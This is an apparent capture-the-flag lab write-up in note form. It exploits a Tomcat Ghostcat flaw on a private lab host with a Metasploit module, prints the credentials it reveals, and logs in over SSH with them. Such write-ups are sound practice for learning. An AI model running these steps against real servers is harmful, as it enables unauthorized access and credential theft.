# Exploitation
---
- **Using metasploit:**
	- `use admin/http/tomcat_ghostcat`
	- `set rhosts 10.10.243.199`
	- `run`
	- ![[Pasted image 20250502164008.png]]
- Reveals the crendentials:
	- ![[Pasted image 20250502164029.png]]
	- `skyfuck`: `8730281lkjlkjdqlksalks`

# SSH to login as `skyfuck`
---
- `ssh skyfuck@10.10.243.199`
- ![[Pasted image 20250502164307.png]]
- 